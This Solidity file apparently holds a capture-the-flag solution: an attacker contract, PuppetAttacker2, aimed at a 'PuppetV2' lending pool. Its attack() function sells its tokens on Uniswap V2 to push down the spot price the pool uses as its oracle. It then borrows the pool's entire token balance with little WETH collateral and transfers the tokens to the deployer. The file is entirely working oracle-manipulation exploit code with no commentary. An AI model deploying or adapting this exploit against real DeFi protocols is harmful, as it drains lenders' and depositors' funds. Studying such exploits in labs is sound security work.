// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUniswapV2Router02 {
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function WETH() external pure returns (address);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external returns (uint256);

    function approve(address spender, uint256 amount) external;
}

interface IPuppetV2Pool {
    function borrow(uint256 amount) external;

    function calculateDepositOfWETHRequired(uint256 tokenAmount)
        external
        view
        returns (uint256);
}

contract PuppetAttacker2 {
    IUniswapV2Router02 uniswap;
    IERC20 token;
    IERC20 weth;

    IPuppetV2Pool pool;
    address payable attacker;

    constructor(
        address _uniswap,
        address _token,
        address _weth,
        address _pool
    ) {
        uniswap = IUniswapV2Router02(_uniswap);
        token = IERC20(_token);
        weth = IERC20(_weth);
        pool = IPuppetV2Pool(_pool);
        attacker = payable(msg.sender);
    }

    function attack() external {
        uint256 bal = token.balanceOf(address(this));
        token.approve(address(uniswap), bal);
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        uniswap.swapExactTokensForTokens(
            bal,
            1,
            path,
            address(this),
            block.timestamp * 2
        );
        uint256 poolBalance = token.balanceOf(address(pool));
        uint256 required = pool.calculateDepositOfWETHRequired(poolBalance);
        weth.approve(address(pool), required);
        pool.borrow(poolBalance);
        uint256 balanceToTransfer = token.balanceOf(address(this));
        token.transfer(attacker, balanceToTransfer);
    }
}
